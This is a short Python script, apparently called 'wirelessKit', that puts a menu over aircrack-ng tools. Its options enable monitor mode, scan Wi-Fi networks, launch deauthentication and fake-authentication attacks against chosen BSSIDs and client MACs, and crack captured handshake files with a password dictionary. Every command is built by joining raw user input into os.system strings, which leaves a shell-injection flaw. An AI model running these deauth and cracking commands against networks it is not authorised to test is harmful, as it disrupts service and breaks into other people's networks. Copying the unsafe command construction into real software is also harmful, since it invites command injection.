#!/usr/bin/python3

import os
from termcolor import colored

def intro():
    print(colored('''          _          _               _  ___ _   
__      _(_)_ __ ___| | ___  ___ ___| |/ (_) |_ 
\ \ /\ / / | '__/ _ \ |/ _ \/ __/ __| ' /| | __|
 \ V  V /| | | |  __/ |  __/\__ \__ \ . \| | |_ 
  \_/\_/ |_|_|  \___|_|\___||___/___/_|\_\_|\__|''', 'blue'))


    print("\n\n[0] Enable Monitor Mode")
    print("[1] Airodump Scan")
    print("[2] Exhaustive Airodump Scan")
    print("[3] DeAuth Attack")
    print("[4] FakeAuth Attack")
    print("[5] Crack Password")
intro()
option = int(input("\n\n[+] Enter an option >> "))

if option == 0:
    print("Select your interface: (Example: wlan0)")
    interface = input(">> ")
    os.system("sudo airmon-ng start " + interface)
    os.system("sudo airmon-ng check kill")
    print("[+] The interface " + interface + " has changed to Monitor Mode")

elif option == 1:
    print("Select your interface: (Example: wlan0)")
    interface = input(">> ")
    os.system("airodump-ng " + interface)

elif option == 2:
    print("Fill the parameters: ")
    q1 = input("Interface >> ")
    q2 = input("Channel >> ")
    q3 = input("BSSID >> ")
    q4 = input("Name to save >> ")
    os.system("airodump-ng -c " + q2 + " --bssid " + q3 + " -w " + q4 + " " + q1)

elif option == 3:
    interface = input("Interface >> ")
    threads = input("How many threads you want >> ")
    bssid = input("BSSID >> ")
    mac_target = input("MAC Target >> ") 
    os.system("aireplay-ng --deauth " + threads + " -a " + bssid + " -c " + " " + mac_target + " " + interface)

elif option == 4:
    interface = input("Interface >> ")
    fake_devices = input("How many fake devices you want >> ")
    bssid = input("BSSID >>")
    mac_interface= input("Enter your MAC interface >> ")
    os.system("aireplay-ng --fakeauth " + fake_devices + " -a " + bssid + " -h " + " " + mac_interface + " " + interface)

elif option == 5:
    name_file = input("Enter the name of the file to crack ( with extension .cap ) >> ")
    bssid = input("BSSID >> ")
    dictionary = input("Path of dictionary to use >> ")
    os.system("aircrack-ng -b " + bssid + " -w " + " " + dictionary + " " + name_file)
